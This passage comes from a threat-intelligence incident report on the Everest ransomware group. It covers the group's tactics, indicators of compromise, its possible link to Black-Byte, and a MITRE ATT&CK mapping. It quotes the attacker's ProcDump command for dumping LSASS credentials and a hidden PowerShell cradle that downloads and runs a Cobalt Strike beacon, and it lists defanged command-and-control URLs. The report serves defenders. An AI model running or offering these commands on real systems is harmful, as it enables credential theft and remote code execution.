However,\nafter recovering and analysing an Everest ransomware file, we assess with medium\nconfidence that Everest ransomware is related to Black-Byte.\n\n## Everest TTPs\n\n### Lateral Movement\n\nThe threat actor was observed using legitimate compromised user accounts and Remote\nDesktop Protocol (RDP) for lateral movement.\n\n### Credential Access\n\nProcDump was used to create a copy of the LSASS process in order to access additional\ncredentials. The following command was observed being executed:\n```\nC:\\Users\\<Compromised User>\\Desktop\\procdump64.exe -ma lsass.exe C:\\Users\\\n<Compromised User>\\Desktop\\lsass<victim’s domain name>.dmp, for example\nlsasscontoso.dmp .\n\n```\nA copy of the NTDS database was also created with a file name of ntds.dit.zip.\n\n### Defence Evasion\n\nThroughout the incident the threat actor routinely removed tooling, reconnaissance output\nfiles and data collection archives from hosts.\n\n### Discovery\n\nNetwork discovery was observed upon the compromise of a new host. This activity was\nprimarily conducted via the use of `netscan.exe,` `netscanpack.exe and`\n```\nSoftPerfectNetworkScannerPortable.exe . These tools allow network scans to identify\n\n```\nfurther hosts of interest as well as building a target list for ransomware deployment.\n\nThe output of these tools were saved as text files in the `C:\\Users\\Public\\Downloads\\`\ndirectory. Examples of these have been included below:\n\n\n-----\n\nC:\\Users\\Public\\Downloads\\subnets.txt\nC:\\Users\\Public\\Downloads\\trustdumps.txt\n\n### Collection\n\nThe threat actor installed the WinRAR application on a file server which was then used to\narchive data ready for exfiltration.\n\n### Command and Control\n\nCobalt Strike was the primary command and control mechanism used by the threat actor.\nThis was executed on hosts using the following command:\n```\npowershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(<IP\nAddress>/a'))\n\n```\nAdditionally, a Metasploit payload was identified within the path `C:\\Users\\Public\\l.exe .`\n\nThe following Remote Access Tools were also deployed by the threat actor as a secondary\ncommand and control method, in addition to added persistence with the tools being installed\nas a service\n\nAnyDesk\nSplashtop Remote Desktop\nAtera\n\n### Exfiltration\n\nThe threat actor utilised the file transfer capabilities of Splashtop to exfiltrate data out of the\nnetwork.\n\n### Impact\n\nEverest’s action on objectives appears to focus on data exfiltration of sensitive information as\nwell as encryption, commonly referred to as double extortion.\n\n## Indicators of Compromise\n\n\n**IOC (indicators of compromise)**\n**Value**\n\n\n**Indicator**\n**Type**\n\n\n**Description**\n\n\nnetscan.exe File name SoftPerfect Network Scanner\n\nnetscanpack.exe File name This was unable to be analysed during\nthe investigation.\n\n\n-----\n\nsvcdsl.exe File name SoftPerfect Network Scanner Portable\n\nWinrar.exe File name Popular archiving tool, which\nsupportsencryption.\n\nsubnets.txt File name Network Discovery output file\n\ntrustdumps.txt File name Network Discovery output file\n\nl.exe File name Metasploit payload\n\nhxxp://3.22.79[.]23:8080/ URL Site hosting Cobalt Strike beacon\n\nhxxp://3.22.79[.]23:8080/a URL Site hosting Cobalt Strike beacon\n\nhxxp://3.22.79[.]23:10443/ga.js URL Cobalt Strike C2\n\nhxxp://18.193.71[.]144:10443/match URL Cobalt Strike C2\n\nhxxp://45.84.0[.]164:10443/o6mJ URL Meterpreter C2\n\n## Attribution\n\nThe recovered ransomware binary is attributed to (based on the ransomware note) the\n‘Everest group’. However, after analysing it, we identified/attributed the sample to Black-Byte\n(C# variant instead of Go). It should be noted that the sample’s compilation timestamp does\nmatch the incident’s timeline.\n\nEven though the sample’s functionality remains the same, we noticed that it does not\ndownload the key from a server anymore. Instead, it is (randomly) generated on the\ncompromised host. In addition, the ransomware’s onion link is different.\n\nBased on our findings, we cannot confirm if a different threat actor copied the source code of\nBlack-Byte and started using it or if the Black-Byte have indeed started using again the C#\nransomware variant.\n\n## MITRE ATT&CK®\n\nTactic Technique ID Description\n\n\nInitial\nAccess\n\n\nExternal Remote Services T1133 Initial Access was through an\ninsecure external service\n\n\nExecution Command and Scripting\nInterpreter: PowerShell\n\n\nT1059.001 Threat actor utilised PowerShell to\nexecute malicious commands\n\n\n-----\n\nExecution Command and Scripting\nInterpreter: Windows\nCommand Shell\n\n\nLateral\nMovement\n\n\nRemote Services:\nRemote Desktop Protocol\n\n\nT1059.003 Threat actor utilised Windows\nCommand Shell to execute\nmalicious commands\n\nT1021.001 Lateral movement was observed\nutilising RDP\n\nT1543.003 Threat actor installed remote\ndesktop software tools as services\nfor persistence\n\nT1003.001 The tool Procdump was used to\ncreate a copy of the LSASS\nprocess\n\nT1003.003 The NTDS.dit was copied\n\nT1070.004 Threat actor routinely deleted\ntooling and output\n\nT1046 Threat actor utilised numerous\nnetwork discovery tools – Netscan\nand SoftPerfectNetworkScanner\n\nT1560.001 Threat actor archived data using\nWinRAR\n\nT1071.001 Cobalt Strike was implemented\nusing HTTPS for C2 traffic\n\n\nPersistence Create or Modify System\nProcess: Windows\nService\n\n\nCredential\nAccess\n\nCredential\nAccess\n\nDefence\nEvasion\n\n\nOS Credential Dumping:\nLSASS Memory\n\nOS Credential Dumping:\nNTDS\n\nIndicator Removal on\nHost: File deletion\n\n\nDiscovery Network Service\nDiscovery\n\nCollection Archive Collected Data:\nArchive via Utility\n\n\nCommand\nand Control\n\nCommand\nand Control\n\n\nApplication Layer\nProtocol: Web Protocols\n\n\nRemote Access Software T1219 Threat actor utilised remote\naccess software – Anydesk,\nSplashtop and Atera\n\n\nExfiltration Exfiltration Over C2\nChannel\n\n\nT1041 Data exfiltration was conducted\nusing the Splashtop application\n\n\nImpact Data Encrypted for Impact T1486 Data was encrypted for impact\n\n## References\n\n\n-----",
